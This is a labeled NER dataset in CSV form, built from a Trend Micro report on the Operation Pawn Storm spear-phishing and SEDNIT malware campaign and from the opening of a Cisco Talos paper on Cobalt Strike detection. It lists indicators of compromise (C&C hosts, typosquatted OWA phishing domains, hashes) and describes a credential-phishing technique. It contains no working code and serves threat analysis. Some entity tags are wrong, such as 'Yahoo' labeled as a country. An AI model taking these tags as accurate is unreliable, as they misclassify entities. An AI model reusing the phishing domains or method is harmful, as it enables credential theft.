wp-operation-pawn-storm," drops 
",O
wp-operation-pawn-storm,advstoreshell.dll,ioc
wp-operation-pawn-storm," 
(SHA-1: ",O
wp-operation-pawn-storm,"E338A57C3 
5A4732BBB5F738E 
2387C1671A002BC 
B",ioc
wp-operation-pawn-storm,"), a keylogger

",O
wp-operation-pawn-storm,Conhost.dll,ioc
wp-operation-pawn-storm," drops 
",ioc
wp-operation-pawn-storm,netui.dll,ioc
wp-operation-pawn-storm," (SHA-1: 
",O
wp-operation-pawn-storm,"5A452E7248A8D37 
45EF53CF2B1F3D7 
D8479546B9",ioc
wp-operation-pawn-storm,"), 
a keylogger, into 
",O
wp-operation-pawn-storm,"\
system32\

",O
wp-operation-pawn-storm,Advstoreshell.dll,ioc
wp-operation-pawn-storm," 
sends logs of stolen 
data to a C&C server 
(software-update.
org)

",O
wp-operation-pawn-storm,Netui.dll,ioc
wp-operation-pawn-storm," sends 
logs of stolen data 
to a C&C server 
(",O
wp-operation-pawn-storm,200.74.244.118,ioc
wp-operation-pawn-storm,")



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

11

Next-Level Phishing Targets

The attackers used specially crafted emails 
to redirect targets to any of several phishing 
websites with domain names that were very 
similar to those of well-known conferences 
and media outfits. These websites did not 
host malicious content but visiting them 
did lead to the automatic execution of a 
nonmalicious ",O
wp-operation-pawn-storm,JavaScript,software
wp-operation-pawn-storm,". Links to these fake 
websites were then embedded in spear-
phishing emails and sent to selected targets.

Opening such an email and clicking the 
link in ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," redirected victims to legitimate 
websites. The ",O
wp-operation-pawn-storm,JavaScript,software
wp-operation-pawn-storm," made it appear that 
the victims’ ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," sessions ended while at 
the same time, tricked them into reentering 
their credentials. To do this, the attackers 
redirected victims to fake ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," log-in pages 
by setting their browsers’ open windows 
property. The victims’ credentials thus ended 
up in the attackers’ hands.

Note that two special conditions need to 
be met for the attacks to succeed—victims 
should use ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," and click the embedded 
links via the web portal’s preview pane. The 
attacks worked on any popular browser such 
as ",O
wp-operation-pawn-storm,Firefox,software
wp-operation-pawn-storm,"®, ",O
wp-operation-pawn-storm,Safari,software
wp-operation-pawn-storm,">®, ",O
wp-operation-pawn-storm,Chrome,software
wp-operation-pawn-storm,"™, and ",O
wp-operation-pawn-storm,"Internet 
Explorer",software
wp-operation-pawn-storm,"®. No vulnerabilities need to be 
exploited for the ",O
wp-operation-pawn-storm,JavaScript,software
wp-operation-pawn-storm," to work.

Because many companies allow employees 
to use webmail services to access their 
mailboxes while on business travel or at 
home, these attacks are likely to succeed. 
Once they do, attackers can gain access to 
compromised mailboxes that they can then 
use to gain a foothold in target networks.

Throughout the course of investigation, 
several targets have been identified, 
including:

• ACADEMI, formerly Blackwater 
(",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm,")

• Broadcasting companies in various 

countries

• Military attachés from various 
countries

• ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm, (,O
wp-operation-pawn-storm,France,country
wp-operation-pawn-storm,")

• ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm, (,O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm,")

• Multinational company based in 
",O
wp-operation-pawn-storm,Germany,country
wp-operation-pawn-storm,"

• ",O
wp-operation-pawn-storm,"Organization for Security and Co-
operation in Europe",org
wp-operation-pawn-storm, (,O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm,) (,O
wp-operation-pawn-storm,Austria,country
wp-operation-pawn-storm,")

• Pakistani military officials

• ",O
wp-operation-pawn-storm,Polish government,org
wp-operation-pawn-storm," employees

• SAIC (",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm,")

• ",O
wp-operation-pawn-storm,U.S. Department of State,org
wp-operation-pawn-storm,"

• ",O
wp-operation-pawn-storm,Vatican Embassy,org
wp-operation-pawn-storm, (,O
wp-operation-pawn-storm,Iraq,country
wp-operation-pawn-storm,")

The following case studies reveal more in-
depth details on four specific attacks.

CASE 1: ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm,", 
",O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm,"

• Malicious conference domain: 
",O
wp-operation-pawn-storm,eurosatory2014.com,ioc
wp-operation-pawn-storm,"

• Real conference domain: 
eurosatory . com

• Phished ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm, domain: ,O
wp-operation-pawn-storm,mail.hm.qov.hu,ioc
wp-operation-pawn-storm,"

• Real ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," domain: mail.hm.gov.hu

The attackers created a domain that was 
very similar to eurosatory . com [14], a website 
for an international land and air-land defense 
and security exhibition. They then sent emails 
with the link, ",O
wp-operation-pawn-storm,http://eurosatory2014.com,ioc
wp-operation-pawn-storm,", to 
selected employees of the target defense 
ministry who might actually have been 
expecting to hear from the conference staff 



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

12

members.

Clicking the link embedded in the email 
via the ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," preview pane opens the real 
conference website in a new tab. The victims’ 
",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," session in the other tab, meanwhile, 
is redirected to a phished log-in page that 
makes it look like the session has ended.

 
Real “EUROSATORY 2014” conference website 

opens in a new tab after clicking the link in a 
spear-phishing email viewed in ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm,"

 
“Closed” ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," session page (fake) victims will 
see, forcing them to reenter their credentials

In reality, the victims’ ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," session did not 
end. The previously mentioned ",O
wp-operation-pawn-storm,JavaScript,software
wp-operation-pawn-storm," 
just redirected them to a fake ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," log-
in page that looks just like the ",O
wp-operation-pawn-storm,"Ministry of 
Defense",org
wp-operation-pawn-storm, in ,O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm,"’s real one.

Apart from “EUROSATORY 2014,” other 
conferences were also used to target 
employees of the ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm," in 
",O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm," as shown in the following table.

Similar Attacks Against the ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm,"

Conference Target Domain Malicious Domain

“Africa Aerospace and Defence 
2014” ",O
wp-operation-pawn-storm,aadexpo.co.za,ioc
wp-operation-pawn-storm, ,O
wp-operation-pawn-storm,aadexpo2014.co.za,ioc
wp-operation-pawn-storm,"

“The 10th Special Operations 
Forces Exhibition & Conference” ",O
wp-operation-pawn-storm,sofexjordan.com,ioc
wp-operation-pawn-storm, ,O
wp-operation-pawn-storm,sofexjordan2014.com,ioc
wp-operation-pawn-storm,"

“ITEC” ",O
wp-operation-pawn-storm,itec.co.uk,ioc
wp-operation-pawn-storm, ,O
wp-operation-pawn-storm,itec2014.co.uk,ioc
wp-operation-pawn-storm,"



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

13

CASE 2: ",O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Austria,country
wp-operation-pawn-storm,"

• Malicious news domain: ",O
wp-operation-pawn-storm,vice-news.com,ioc
wp-operation-pawn-storm,"

• Real news domain: news.vice.com

• Phished ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm, domain: ,O
wp-operation-pawn-storm,log-in-osce.org,ioc
wp-operation-pawn-storm,"

• Real ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," domain: log-in.osce.org

This attack targeted ",O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm," employees in 
",O
wp-operation-pawn-storm,Austria,country
wp-operation-pawn-storm,". Although the attackers used similar 
tactics, they did not spoof a conference 
website. They instead used a fake version of 
the news website, news.vice.com.

 
Comparison of the legitimate (top) and spoofed 

(bottom) ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm, log-in pages of ,O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm,"

Even though ",O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm," provides better security 
for webmail users compared with the other 
targets via one-time session token use during 
log-in, attackers can still steal highly sensitive 
data from victims by hijacking a single 
session.

CASE 3: SAIC, ",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm,"

• Malicious conference domain: 
",O
wp-operation-pawn-storm,natoexhibitionff14.com,ioc
wp-operation-pawn-storm,"

• Real conference domain: 
natoexhibition.org

• Phished ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm, domain: ,O
wp-operation-pawn-storm,webmail-saic.com,ioc
wp-operation-pawn-storm,"

• Real ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," domain: webmail.saic.com

This attack targeting SAIC was very similar 
to the first case. The attackers spoofed 
the website of the “Future Forces 2014” 
conference to trick email recipients into 
handing over their webmail credentials.

 
Comparison of the legitimate (top) and spoofed 

(bottom) ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," log-in pages of SAIC

CASE 4: ACADEMI

• Malicious news domain: ",O
wp-operation-pawn-storm,tolonevvs.com,ioc
wp-operation-pawn-storm,"

• Real news domain: tolonews.com

• Phished ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," domain: academl.com

• Real ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," domain: academi.com



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

14

This attack targeted the employees of U.S. 
defense contractor, ACADEMI, using the 
same phishing tactics as in the second case.

 
Comparison of the legitimate (top) and spoofed 

(bottom) ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," log-in pages of ACADEMI

Apart from the four specific cases presented 
above, evidence pointing to a fake ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," 
server for a multinational company based in 
",O
wp-operation-pawn-storm,Germany,country
wp-operation-pawn-storm," was also discovered. The threat 
actors registered a domain that looked 
very similar to the target’s real domain and 
purchased a Secure Sockets Layer (SSL) 
certificate for the fake domain as part of 
preparations for a targeted attack. Trend 
Micro was able to warn the target early on, 
which helped thwart the threat.

Other Webmail Services

",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," users are not the only ones at risk 
though, as the threat actors behind Operation 
",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," also targeted users of free 
webmail services such as ",O
wp-operation-pawn-storm,Gmail,software
wp-operation-pawn-storm,"™, ",O
wp-operation-pawn-storm,Live Mail,software
wp-operation-pawn-storm,", 
",O
wp-operation-pawn-storm,Yahoo,org
wp-operation-pawn-storm,"!®, Hushmail, and ",O
wp-operation-pawn-storm,Yandex,org
wp-operation-pawn-storm,".



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

15

 
Sample ",O
wp-operation-pawn-storm,Gmail,software
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Live Mail,software
wp-operation-pawn-storm,", Hushmail, and ",O
wp-operation-pawn-storm,Yandex,org
wp-operation-pawn-storm," account phishing websites

We leaked specific credentials to the threat 
actors in a couple of cases to see if the 
fake webmail service log-in pages were 
indeed intended for attack use. Within 
minutes of leaking the test credentials, 
unauthorized log-ins were recorded. The 
first log-in was usually an automated log-
in check from the same IP address as the 
phishing website’s owner. The succeeding 
log-ins were made from the IP addresses, 

46.166.162.90 (",O
wp-operation-pawn-storm,Yahoo,country
wp-operation-pawn-storm,") and 192.154.110.244 
(",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm,"), via Internet Message Access 
Protocol (IMAP). No other forms of abuse 
such as sending spam via the compromised 
accounts were witnessed. This showed that 
the attackers were indeed trying to obtain 
sensitive data from their targets instead 
of using their accounts for fraud and other 
financially motivated scams.



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

16

CONCLUSION

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," used next-level 
spear-phishing tactics to obtain the email 
credentials of primarily military, embassy, 
and defense contractor personnel from the 
",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm," and its allies. The threat actors 
used a mix of spear-phishing emails and 
specially crafted webmail service phishing 
websites to gain access to victims’ inboxes in 
hopes of getting better footholds inside target 
organizations. So as not to raise suspicion, 
the attackers used well-known events and 
conferences as social engineering bait. They 
have been quite persistent as well, as we 
have seen evidence that attacks have been 
going on since ",O
wp-operation-pawn-storm,2007,timestamp
wp-operation-pawn-storm,".

Apart from effective phishing tactics, the 
threat actors used a combination of proven 
targeted attack staples to compromise 
systems and get in to target networks—
exploits and data-stealing malware. ",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm," 
variants particularly proved useful, as 
these allowed the threat actors to steal all 
manners of sensitive information from the 
victims’ computers while effectively evading 
detection.

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," has notified the targets that have 
been identified in this paper. Individuals and 
their respective organizations, meanwhile, 
should use solutions that can help protect 
against the various attack vectors that the 
threat actors behind Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," 
used.

Messaging security solutions such as ",O
wp-operation-pawn-storm,"Trend 
Micro",org
wp-operation-pawn-storm,™ ,O
wp-operation-pawn-storm,InterScan,software
wp-operation-pawn-storm,"™ Messaging Security 
[15] and the ",O
wp-operation-pawn-storm,ScanMail,software
wp-operation-pawn-storm,™ Suite for ,software
wp-operation-pawn-storm,"Microsoft 
Exchange",software
wp-operation-pawn-storm," [16] can send suspicious email 
attachments to a sandbox for analysis, thus 
protecting recipients from threats. Other 
products such as ",O
wp-operation-pawn-storm,OfficeScan,software
wp-operation-pawn-storm,"™ [17] for 
endpoints and ",O
wp-operation-pawn-storm,InterScan,software
wp-operation-pawn-storm," Web Security Virtual 
Appliance [18] for gateways can also block 
user access to known phishing sites.

For overall protection against targeted 
attacks, ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm,"™ Deep Discovery 
[19] can help protect potential targets by 
sandboxing and analyzing suspicious 
attachments to identify phishing emails via 
Email Inspector. Via 360-degree monitoring 
of network traffic to get networkwide 
visibility and intelligence, Deep Discovery 
allows users to detect and respond to 
targeted attacks and advanced threats. 
It also monitors all ports and more than 
80 protocols, giving users the broadest 
protection available. Even more, specialized 
detection engines and custom sandboxing 
help identify and analyze malware, C&C 
communications, and evasive attacker 
activities that are invisible to standard 
security solutions. Along with in-depth threat 
intelligence, it allows for rapid response 
and automatic sharing with other security 
products to create real-time custom defense 
against attacks.



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

17

REFERENCES

[1] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). 
Threat Encyclopedia. “",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,".” Last 
accessed October 13, 2014, http:// about-threats.trendmicro.com/us/search. aspx?p=SEDNIT.

[2] Symantec Corporation. (1995‒2014). 
Symantec. “Infostealer.Sofacy.” Last 
accessed ",O
wp-operation-pawn-storm,"October 17, 2014",timestamp
wp-operation-pawn-storm,", http:// www.symantec.com/security_response/ writeup.jsp?docid=2011-090714-2907-99&tabid=2.

[3] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Threat 
Encyclopedia. “",O
wp-operation-pawn-storm,BKDR_SEDNIT.AE.,malware
wp-operation-pawn-storm,"” Last 
accessed October 13, 2014, http://about-
threats.trendmicro.com/us/malware/
BKDR_SEDNIT.AE.

[4] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Threat 
Encyclopedia. “",O
wp-operation-pawn-storm,BKDR_SEDNIT.SM.,malware
wp-operation-pawn-storm,"” Last 
accessed ",O
wp-operation-pawn-storm,"October 13, 2014",timestamp
wp-operation-pawn-storm,", http://about-
threats.trendmicro.com/us/malware/
BKDR_SEDNIT.SM.

[5] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). 
Threat Encyclopedia. “",O
wp-operation-pawn-storm,"TROJ_SEDNIT.
TOK.",malware
wp-operation-pawn-storm,” Last accessed ,O
wp-operation-pawn-storm,"October 13, 2014",timestamp
wp-operation-pawn-storm,", 
http://about-threats.trendmicro.com/us/
malware/TROJ_SEDNIT.TOK.

[6] Wikimedia Foundation Inc. (March 16, 
2014). Wikipedia. “",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,".” Last 
accessed October 21, 2014, http://
en.wikipedia.org/wiki/Pawn_storm.

[7] The MITRE Corporation. (1999–2014). 
CVE. “",O
wp-operation-pawn-storm,CVE-2010-3333,O
wp-operation-pawn-storm,".” Last accessed 
",O
wp-operation-pawn-storm,"October 16, 2014",timestamp
wp-operation-pawn-storm,", http://cve.MITRE.org/cgi- bin/cvename.cgi?name=CVE-2010-3333.

[8] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). 
Threat Encyclopedia. “",O
wp-operation-pawn-storm,TROJ_ARTIEF,malware
wp-operation-pawn-storm,".” 
Last accessed ",O
wp-operation-pawn-storm,"October 21, 2014",timestamp
wp-operation-pawn-storm,", http://
www.trendmicro.com/vinfo/us/threat-
encyclopedia/malware/TROJ_ARTIEF.

[9] Post Staff. (January 9, 2012). New York 
Post. “Three Car Bombs Explode in ",O
wp-operation-pawn-storm,Iraq,country
wp-operation-pawn-storm,", 
Killing 17.” Last accessed ",O
wp-operation-pawn-storm,"October 16, 
2014",timestamp
wp-operation-pawn-storm,", http://nypost.com/2012/01/09/three-
car-bombs-explode-in-Iraq-killing-17/.

[10] The ",O
wp-operation-pawn-storm,MITRE,org
wp-operation-pawn-storm," Corporation. (1999–
2014). CVE. “",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm,".” Last 
accessed ",O
wp-operation-pawn-storm,"October 16, 2014",timestamp
wp-operation-pawn-storm,", http://www.cve.MITRE.org/cgi-bin/cvename.cgi?name=CVE-2012-0158.

[11] IQPC. (2014). Homeland Security 
Summit Middle East. “Towards Total 
Preparedness: Advancing Command and 
Control and Communication for Increased 
Identification, Access, Surveillance, 
Cyber Protection Capabilities.” Last 
accessed ",O
wp-operation-pawn-storm,"October 16, 2014",timestamp
wp-operation-pawn-storm,", http://www.
homelandsecurityme.com/.

[12] Malware@prevenity. (September 11, 
2014). “mht, MS12-27 oraz *malware*.
info.” Last accessed ",O
wp-operation-pawn-storm,"October 16, 2014",timestamp
wp-operation-pawn-storm,", 
http://malware.prevenity.com/2014/08/
malware-info.html.

[13] R136a1. (December 27, 2012). 
Analyzing Unknown Malware. “#3 
Disclosure of Another 0-Day Malware—
Update and Additional Information.” 
Last accessed ",O
wp-operation-pawn-storm,"October 17, 2014",timestamp
wp-operation-pawn-storm,", 
http://thegoldenmessenger.blogspot.
ro/2012/12/3-disclosure-of-another-0day-
malware_27.html.

[14] COGES. (2013). EUROSATORY 2014. 
“The Largest International Land and Air-
Land Defence and Security Exhibition.” 
Last accessed ",O
wp-operation-pawn-storm,"October 17, 2014",timestamp
wp-operation-pawn-storm,", http://
www.eurosatory.com/.

[15] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Trend 
Micro. “InterScan Messaging Security.” 
Last accessed ",O
wp-operation-pawn-storm,"October 21, 2014",timestamp
wp-operation-pawn-storm,", http://
www.trendmicro.com/us/enterprise/
network-security/interscan-message-



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

18

security/.

[16] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Trend 
Micro. “ScanMail Suite for Microsoft 
Exchange.” Last accessed ",O
wp-operation-pawn-storm,October 21,timestamp
wp-operation-pawn-storm,", 
2014, http://www.trendmicro.com/us/
enterprise/network-web-messaging-
security/scanmail-microsoft-exchange/.

[17] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Trend 
Micro. “OfficeScan—Endpoint Protection.” 
Last accessed ",O
wp-operation-pawn-storm,"October 22, 2014",timestamp
wp-operation-pawn-storm,", http://
www.trendmicro.com/us/enterprise/
product-security/officescan/.

[18] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated. (2014). Trend 
Micro. “InterScan Web Security Virtual 
Appliance.” Last accessed ",O
wp-operation-pawn-storm,"October 22, 
2014",timestamp
wp-operation-pawn-storm,", http://www.trendmicro.com/us/
enterprise/network-security/interscan-
web-security/virtual-appliance/.

[19] ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, Incorporated. (2014). ,O
wp-operation-pawn-storm,"Trend 
Micro",org
wp-operation-pawn-storm,". “Deep Discovery Advanced 
Network Security.” Last accessed ",O
wp-operation-pawn-storm,"October 
21, 2014",timestamp
wp-operation-pawn-storm,", http://www.trendmicro.com/
us/enterprise/security-risk-management/
deep-discovery/.



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Incorporated, a global leader in security software, strives to make the 
world safe for exchanging digital information. Our innovative solutions for consumers, 
businesses and governments provide layered content security to protect information 
on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are 
powered by cloud-based global threat intelligence, the ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm,™ ,O
wp-operation-pawn-storm,"Smart Protection 
Network",software
wp-operation-pawn-storm,"™, and are supported by over 1,200 threat experts around the globe. For more 
information, visit www.trendmicro.com.

©2014 by ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm,", Incorporated. All rights reserved. ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," and the Trend 
Micro t-ball logo are trademarks or registered trademarks of ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm,", Incorporated. 
All other product or company names may be trademarks or registered trademarks of 
their owners.

225 E. John Carpenter Freeway, Suite 1500
",O
wp-operation-pawn-storm,Irving,city
wp-operation-pawn-storm,", Texas 75062 ",O
wp-operation-pawn-storm,U.S.A.,country
wp-operation-pawn-storm,"

Phone: +1.817.569,8900

http://www.trendmicro.com/us/index.html

	Introduction
	Ties That Bind the Operation Pawn

	Storm Attacks Together
	",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,"
	Attack Timeline
	Attack Details
	Attack Evolution
	Next-Level Phishing Targets
	Case 1: ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm,"
	Case 2: ",O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Austria,country
wp-operation-pawn-storm,"
	Case 3: SAIC, ",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm,"
	Case 4: Academi

	Other Webmail Services

	Conclusion
	References",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,page 1 of 29© 2020 ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science  
of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"
BY ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,NICK MAVIS,identity
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

EDITED BY ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JOE MARSHALL,identity
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, AND ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JON MUNSHAW,identity
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

Updated ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"September 11, 2020",timestamp
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

https://twitter.com/nickmavis


page 2 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@Cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

TABLE OF CONTENTS
Introduction ................................................................................................................................................................................ 3

Getting up to speed .................................................................................................................................................................... 3

Listeners ........................................................................................................................................................................... 3

Web management ............................................................................................................................................................. 4

Reporting .......................................................................................................................................................................... 5

Attack analysis ........................................................................................................................................................................... 5

Target Module: Raw Shellcode generator ......................................................................................................................... 5

Execution .......................................................................................................................................................................... 5

Detection .......................................................................................................................................................................... 7

Target module: Staged/stageless executable generator ................................................................................................... 8

C2 Communication ......................................................................................................................................................... 10

Target Module: HTML application attack generator ........................................................................................................ 13

Target Module: Scripted web delivery ............................................................................................................................. 16

Target Module: Signed Java Applet Attack ..................................................................................................................... 17

Target Module: Smart Java Applet Attack ....................................................................................................................... 18

Target module: System profiler ....................................................................................................................................... 24

Conclusion ................................................................................................................................................................................ 26

Appendix A: Coverage.............................................................................................................................................................. 27

Staged/Stageless Executables ....................................................................................................................................... 27

Scripted Web Delivery ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," .................................................................................................................................. 27

Beacon Binary Payloads .................................................................................................................................................. 27

Beacon ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,PowerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payloads .......................................................................................................................................... 27

HTML Application (HTA) Attacks ..................................................................................................................................... 27

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed applet attack .................................................................................................................................. 28

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," smart applet attack .................................................................................................................................... 28

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system profiler attack ................................................................................................................................ 28



page 3 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

INTRODUCTION
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is ubiquitous in the cyber security arena. It’s 
a prolific toolkit used at many levels of intrusion to solve 
adversaries' problems like post-intrusion exploitation, 
beaconing for command and control (C2s), stealth and 
reconnaissance.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," is a modularized attack framework: Each 
module fulfills a specific function and stands alone. It’s hard 
to detect, because its components might be customized 
derivatives from another module, new, or completely 
absent. Malicious actors find ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"’s obfuscation 
techniques and robust tools for C2, stealth and data 
exfiltration particularly attractive.

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, Talos recently updated its ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,SNORT,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,® and ,O
